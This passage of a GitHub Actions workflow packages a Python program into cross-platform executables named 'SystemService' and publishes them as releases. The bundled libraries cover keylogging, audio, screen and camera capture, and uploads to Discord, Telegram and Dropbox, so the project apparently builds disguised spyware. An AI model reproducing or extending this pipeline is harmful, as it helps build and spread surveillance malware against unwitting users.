            --hidden-import mimetypes \
            --hidden-import pathlib \
            --hidden-import glob \
            --hidden-import fnmatch \
            --hidden-import ctypes \
            --hidden-import email \
            --hidden-import smtplib \
            --hidden-import ftplib \
            --hidden-import xml.etree.ElementTree \
            --hidden-import csv \
            --hidden-import zipfile \
            --hidden-import io \
            --hidden-import random \
            --hidden-import string \
            --hidden-import datetime \
            --hidden-import time \
            --hidden-import os \
            --hidden-import sys \
            --collect-all kivy \
            --collect-all plyer \
            --collect-all pynput \
            --collect-all cryptography \
            --collect-all PIL \
            --collect-all cv2 \
            --collect-all numpy \
            --collect-all sounddevice \
            --collect-all pyaudio \
            --collect-all scapy \
            --collect-all discord_webhook \
            --collect-all telebot \
            --collect-all dropbox \
            --collect-all mss \
            --collect-all psutil \
            --collect-all requests \
            --collect-all urllib3 \
            --collect-all certifi \
            --collect-all idna \
            --collect-all charset_normalizer \
            --additional-hooks-dir=hooks \
            main.py

      - name: Upload Linux executable
        uses: actions/upload-artifact@v4
        with:
          name: linux-exe
          path: dist/SystemService
          retention-days: 30

  create-release:
    needs: [build-android, build-windows, build-macos, build-linux]
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            artifacts/android-apk/*.apk
            artifacts/windows-exe/*.exe
            artifacts/macos-exe/SystemService
            artifacts/linux-exe/SystemService
          draft: false
          prerelease: false
          generate_release_notes: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
